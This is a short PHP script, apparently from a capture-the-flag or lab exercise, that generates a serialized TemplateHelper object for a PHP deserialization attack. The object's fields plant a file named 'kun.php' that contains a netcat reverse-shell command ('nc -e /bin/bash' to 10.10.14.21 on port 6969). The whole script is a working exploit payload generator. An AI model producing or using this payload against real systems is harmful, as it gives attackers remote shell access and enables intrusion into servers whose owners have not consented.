<?php
class TemplateHelper
{
  public function __construct(string $file, string $data)
  {    	
    $this->file= 'kun.php';
    $this->data= '<?php exec("nc -e /bin/bash 10.10.14.21 6969"); ?>';
  }
}

$obj = new TemplateHelper('kun','kun');
echo serialize($obj);
echo "\n";
?>
